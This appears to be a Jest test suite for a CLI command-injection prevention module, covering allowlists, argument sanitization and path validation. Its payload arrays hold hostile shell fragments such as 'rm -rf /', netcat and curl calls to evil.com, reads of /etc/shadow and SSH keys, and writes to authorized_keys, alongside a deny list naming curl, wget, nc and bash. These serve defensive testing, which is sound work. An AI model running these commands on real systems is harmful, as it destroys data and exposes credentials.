/**
 * @fileoverview Command injection prevention verification tests
 * @lastmodified 2025-07-28T10:30:00Z
 *
 * Features: Command injection attack prevention, safe CLI execution, input validation
 * Main APIs: CommandInjectionPrevention, safe command execution, argument sanitization
 * Constraints: Only whitelisted commands allowed, all args sanitized, no code execution
 * Patterns: Security testing, attack simulation, command validation
 */

import {
  CommandInjectionPrevention,
  commandInjectionPrevention,
  validateCommand,
  safeExecute,
  createSafeCommand,
  validateFilePath,
} from '@/cli/utils/command-injection-prevention';

describe('Command Injection Prevention Verification', () => {
  let cip: CommandInjectionPrevention;

  beforeEach(() => {
    cip = CommandInjectionPrevention.getInstance();
  });

  /**
   * Malicious command injection payloads for testing
   */
  const COMMAND_INJECTION_PAYLOADS = [
    // Command chaining
    '; rm -rf /',
    '&& curl evil.com',
    '|| cat /etc/passwd',
    '| nc evil.com 4444',

    // Command substitution
    '$(cat /etc/passwd)',
    '`whoami`',
    '$(curl evil.com)',
    '`rm -rf /`',

    // Process substitution
    '<(curl evil.com)',
    '>(nc evil.com 4444)',

    // Redirection attacks
    '> /etc/passwd',
    '>> ~/.ssh/authorized_keys',
    '< /etc/shadow',
    '2> /dev/null; rm -rf /',

    // Environment variable injection
    '${PATH}',
    '${HOME}/../../../etc/passwd',
    '${USER:-$(rm -rf /)}',

    // Globbing attacks
    '*',
    '../../*',
    '/etc/*',
    '~/.ssh/*',

    // Script execution
    'script.sh',
    'malware.bat',
    'evil.py',
    'hack.rb',

    // Network operations
    'wget http://evil.com/malware',
    'curl -X POST evil.com',
    'nc -l 4444',
    'ssh user@evil.com',

    // Null byte injection
    'file.txt\x00.sh',
    'safe\x00; rm -rf /',

    // Path traversal
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\cmd.exe',
    '/../../../../root/.ssh/id_rsa',
  ];

  /**
   * Dangerous commands that should always be blocked
   */
  const DANGEROUS_COMMANDS = [
    'rm',
    'del',
    'format',
    'curl',
    'wget',
    'nc',
    'ssh',
    'sudo',
    'python',
    'node',
    'bash',
    'sh',
    'powershell',
    'cmd',
    'eval',
    'exec',
    'chmod',
    'mount',
    'reboot',
    'shutdown',
  ];

  describe('Command Validation', () => {
    test('should block dangerous commands', () => {
      DANGEROUS_COMMANDS.forEach(dangerousCmd => {
        const result = cip.validateCommand(dangerousCmd, []);

        expect(result.safe).toBe(false);
        expect(result.blockedPatterns).toContain(`Dangerous command: ${dangerousCmd}`);
        expect(cip.isDangerousCommand(dangerousCmd)).toBe(true);
      });
    });

    test('should allow safe commands', () => {
      const safeCommands = ['ls', 'cat', 'echo', 'git', 'npm'];

      safeCommands.forEach(safeCmd => {
        const result = cip.validateCommand(safeCmd, []);

        expect(result.safe).toBe(true);
        expect(result.sanitizedCommand).toBe(safeCmd);
        expect(result.blockedPatterns).toHaveLength(0);
        expect(cip.isDangerousCommand(safeCmd)).toBe(false);
      });
    });

    test('should sanitize command names with special characters', () => {
      const maliciousCommands = [
        'ls; rm -rf /',
        'cat && curl evil.com',
        'echo | nc evil.com',
        'git`whoami`',
      ];

      maliciousCommands.forEach(maliciousCmd => {
        const result = cip.validateCommand(maliciousCmd, []);

        expect(result.safe).toBe(false);
        expect(result.sanitizedCommand).not.toContain(';');
        expect(result.sanitizedCommand).not.toContain('&');
        expect(result.sanitizedCommand).not.toContain('|');
        expect(result.sanitizedCommand).not.toContain('`');
        expect(result.blockedPatterns.length).toBeGreaterThan(0);
      });
    });

    test('should reject command injection in arguments', () => {
      COMMAND_INJECTION_PAYLOADS.forEach(payload => {
        const result = cip.validateCommand('ls', [payload]);

        expect(result.safe).toBe(false);
        expect(result.blockedPatterns.length).toBeGreaterThan(0);
      });
    });

    test('should enforce argument length limits', () => {
      const longArg = 'A'.repeat(2000); // Exceeds maxArgLength (1000)
      const result = cip.validateCommand('ls', [longArg]);

      expect(result.safe).toBe(false);
      expect(result.blockedPatterns).toContain('Argument 0 exceeds maximum length (1000)');
    });

    test('should enforce total arguments length limits', () => {
      const args = Array(200).fill('A'.repeat(100)); // Total > 10000 chars
      const result = cip.validateCommand('ls', args);

      expect(result.safe).toBe(false);
      expect(
        result.blockedPatterns.some(p => p.includes('Total arguments length exceeds maximum'))
      ).toBe(true);
    });

    test('should validate allowed flags when specified', () => {
      const options = { allowedFlags: ['l', 'a', 'h'] };

      // Valid flags should pass
      const validResult = cip.validateCommand('ls', ['-la'], options);
      expect(validResult.safe).toBe(true);

      // Invalid flags should fail
      const invalidResult = cip.validateCommand('ls', ['-rf'], options);
      expect(invalidResult.safe).toBe(false);
      expect(invalidResult.blockedPatterns).toContain('Flag not allowed: -rf');
    });
  });

  describe('Safe Command Execution', () => {
    test('should execute safe commands successfully', async () => {
      const result = await cip.safeExecute('echo', ['Hello World']);

      expect(result.success).toBe(true);
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('Hello World');
      expect(result.command).toBe('echo');
      expect(result.args).toEqual(['Hello World']);
    });

    test('should block dangerous command execution', async () => {
      await expect(cip.safeExecute('rm', ['-rf', '/'])).rejects.toThrow(
        'Command execution blocked'
      );
    });

    test('should block command injection in arguments', async () => {
      for (const payload of COMMAND_INJECTION_PAYLOADS.slice(0, 5)) {
        await expect(cip.safeExecute('echo', [payload])).rejects.toThrow(
          'Command execution blocked'
        );
      }
    });

    test('should respect execution timeout', async () => {
      const start = Date.now();

      // Use a command that doesn't exist to trigger timeout faster
      const result = await cip.safeExecute('nonexistent-command', [], { timeout: 1000 });

      const duration = Date.now() - start;
      expect(duration).toBeLessThan(2000); // Should timeout/error quickly
      expect(result.success).toBe(false);
    });

    test('should handle command execution errors gracefully', async () => {
      const result = await cip.safeExecute('ls', ['/nonexistent-directory']);

      expect(result.success).toBe(false);
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toContain('No such file or directory');
    });
  });

  describe('Command Wrapper Creation', () => {
    test('should create safe command wrappers', () => {
      const gitCommand = cip.createSafeCommand('git', ['status', 'log', 'diff']);

      expect(gitCommand).toHaveProperty('validate');
      expect(gitCommand).toHaveProperty('execute');
      expect(typeof gitCommand.validate).toBe('function');
      expect(typeof gitCommand.execute).toBe('function');
    });

    test('should validate arguments in command wrapper', () => {
      const gitCommand = cip.createSafeCommand('git', ['status']);

      // Valid flag should work
      expect(() => gitCommand.validate(['status'])).not.toThrow();

      // Invalid flag should throw
      expect(() => gitCommand.validate(['rm'])).toThrow('Invalid argument');
    });

    test('should execute commands through wrapper', async () => {
      const echoCommand = cip.createSafeCommand('echo', []);

      const result = await echoCommand.execute(['Test Output']);
      expect(result.success).toBe(true);
      expect(result.stdout.trim()).toBe('Test Output');
    });
  });

  describe('File Path Validation', () => {
    test('should validate safe file paths', () => {
      const result = CommandInjectionPrevention.validateFilePath('./safe-file.txt');

      expect(result.safe).toBe(true);
      expect(result.warnings).toHaveLength(0);
    });

    test('should block path traversal attempts', () => {
      const traversalPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/../../../../root/.ssh/id_rsa',
        './../../secrets/config.json',
      ];

      traversalPaths.forEach(path => {
        const result = CommandInjectionPrevention.validateFilePath(path);

        expect(result.safe).toBe(false);
        expect(result.warnings).toContain('Path traversal detected');
      });
    });

    test('should enforce allowed directory restrictions', () => {
      const allowedDirs = ['/home/user/safe', '/tmp/workspace'];

      // Path within allowed directory should pass
      const safeResult = CommandInjectionPrevention.validateFilePath(
        '/home/user/safe/file.txt',
        allowedDirs
      );
      expect(safeResult.safe).toBe(true);

      // Path outside allowed directory should fail
      const unsafeResult = CommandInjectionPrevention.validateFilePath('/etc/passwd', allowedDirs);
      expect(unsafeResult.safe).toBe(false);
      expect(unsafeResult.warnings).toContain('Path outside allowed directories');
    });

    test('should warn about dangerous file extensions', () => {
      const dangerousFiles = [
        'script.sh',
        'malware.bat',
        'evil.cmd',
        'hack.ps1',
        'backdoor.py',
        'virus.rb',
      ];

      dangerousFiles.forEach(file => {
        const result = CommandInjectionPrevention.validateFilePath(file);

        expect(result.warnings.some(w => w.includes('dangerous file extension'))).toBe(true);
      });
    });
  });

  describe('Convenience Functions', () => {
    test('validateCommand convenience function should work', () => {
      const result = validateCommand('ls', ['-la']);

      expect(result.safe).toBe(true);
      expect(result.sanitizedCommand).toBe('ls');
      expect(result.sanitizedArgs).toEqual(['-la']);
    });

    test('safeExecute convenience function should work', async () => {
      const result = await safeExecute('echo', ['Convenience Test']);

      expect(result.success).toBe(true);
      expect(result.stdout.trim()).toBe('Convenience Test');
    });

    test('createSafeCommand convenience function should work', () => {
      const command = createSafeCommand('git', ['status']);

      expect(command).toHaveProperty('validate');
      expect(command).toHaveProperty('execute');
    });

    test('validateFilePath convenience function should work', () => {
      const result = validateFilePath('./test-file.txt');

      expect(result.safe).toBe(true);
      expect(result.normalizedPath).toMatch(/test-file\.txt$/);
    });
  });

  describe('Command Management', () => {
    test('should allow adding and removing commands from allowlist', () => {
      const customCommand = 'custom-tool';

      // Initially not allowed
      expect(cip.getAllowedCommands()).not.toContain(customCommand);

      // Add to allowlist
      cip.addAllowedCommand(customCommand);
      expect(cip.getAllowedCommands()).toContain(customCommand);

      // Remove from allowlist
      cip.removeAllowedCommand(customCommand);
      expect(cip.getAllowedCommands()).not.toContain(customCommand);
    });

    test('should provide lists of allowed and dangerous commands', () => {
      const allowedCommands = cip.getAllowedCommands();
      const dangerousCommands = cip.getDangerousCommands();

      expect(Array.isArray(allowedCommands)).toBe(true);
      expect(Array.isArray(dangerousCommands)).toBe(true);
      expect(allowedCommands.length).toBeGreaterThan(0);
      expect(dangerousCommands.length).toBeGreaterThan(0);

      // Should contain expected commands
      expect(allowedCommands).toContain('git');
      expect(allowedCommands).toContain('npm');
      expect(dangerousCommands).toContain('rm');
      expect(dangerousCommands).toContain('curl');
    });
  });

  describe('Advanced Attack Scenarios', () => {
    test('should prevent polyglot command injection', () => {
      const polyglotPayloads = [
        'file.txt"; rm -rf / #',
        "file.txt'; curl evil.com #",
        'file.txt`; cat /etc/passwd`',
        'file.txt$(; wget evil.com)',
      ];

      polyglotPayloads.forEach(payload => {
        const result = cip.validateCommand('cat', [payload]);

        expect(result.safe).toBe(false);
        expect(result.blockedPatterns.length).toBeGreaterThan(0);
      });
    });

    test('should prevent encoded injection attempts', () => {
      const encodedPayloads = [
        'file%20%26%26%20rm%20-rf%20%2F', // URL encoded: file && rm -rf /
        'file\x20\x26\x26\x20rm', // Hex encoded
        'file\u0020\u0026\u0026\u0020rm', // Unicode encoded
      ];

      encodedPayloads.forEach(payload => {
        const result = cip.validateCommand('cat', [payload]);

        // Should be sanitized and potentially blocked
        expect(result.sanitizedArgs[0]).not.toEqual(payload);
      });
    });

    test('should prevent chained command injection', () => {
      const chainedCommands = [
        'file.txt; echo "hacked"',
        'file.txt && echo "pwned"',
        'file.txt || echo "owned"',
        'file.txt | echo "compromised"',
      ];

      chainedCommands.forEach(command => {
        const result = cip.validateCommand('cat', [command]);

        expect(result.safe).toBe(false);
        expect(result.blockedPatterns.some(p => p.includes('Dangerous pattern'))).toBe(true);
      });
    });

    test('should prevent environment variable exploitation', () => {
      const envPayloads = [
        '${PATH}/../../../etc/passwd',
        '${HOME}/../.ssh/id_rsa',
        '${USER:-$(rm -rf /)}',
        '$HOME/../../etc/shadow',
      ];

      envPayloads.forEach(payload => {
        const result = cip.validateCommand('cat', [payload]);

        expect(result.safe).toBe(false);
        expect(
          result.blockedPatterns.some(
            p => p.includes('Dangerous pattern') || p.includes('Path traversal')
          )
        ).toBe(true);
      });
    });
  });

  describe('Real-world CLI Integration', () => {
    test('should safely handle git commands', async () => {
      // Valid git command should work
      const validResult = await cip.safeExecute('git', ['--version']);
      expect(validResult.success).toBe(true);

      // Malicious git command should be blocked
      await expect(cip.safeExecute('git', ['log', '; rm -rf /'])).rejects.toThrow(
        'Command execution blocked'
      );
    });

    test('should safely handle npm commands', () => {
      // Valid npm command validation
      const validResult = cip.validateCommand('npm', ['list']);
      expect(validResult.safe).toBe(true);

      // Malicious npm command should be blocked
      const maliciousResult = cip.validateCommand('npm', ['install', '$(curl evil.com)']);
      expect(maliciousResult.safe).toBe(false);
    });

    test('should safely handle file operations', () => {
      // Safe file operations
      const safeResult = cip.validateCommand('cat', ['./safe-file.txt']);
      expect(safeResult.safe).toBe(true);

      // Dangerous file operations should be blocked
      const dangerousResult = cip.validateCommand('cat', ['../../../etc/passwd']);
      expect(dangerousResult.safe).toBe(false);
    });

    test('should maintain security with working directory restrictions', () => {
      const options = { restrictToWorkingDir: true };

      // Relative paths should be allowed
      const relativeResult = cip.validateCommand('ls', ['./subdirectory'], options);
      expect(relativeResult.safe).toBe(true);

      // Absolute paths outside working directory should be blocked
      const absoluteResult = cip.validateCommand('ls', ['/etc'], options);
      expect(absoluteResult.safe).toBe(false);
      expect(
        absoluteResult.blockedPatterns.some(p => p.includes('outside working directory'))
      ).toBe(true);
    });
  });

  describe('Singleton and Instance Management', () => {
    test('should maintain singleton pattern', () => {
      const instance1 = CommandInjectionPrevention.getInstance();
      const instance2 = CommandInjectionPrevention.getInstance();

      expect(instance1).toBe(instance2);
      expect(instance1).toBe(commandInjectionPrevention);
    });

    test('should maintain state across instance calls', () => {
      const instance = CommandInjectionPrevention.getInstance();

      instance.addAllowedCommand('test-command');

      const anotherReference = CommandInjectionPrevention.getInstance();
      expect(anotherReference.getAllowedCommands()).toContain('test-command');

      // Cleanup
      instance.removeAllowedCommand('test-command');
    });
  });
});
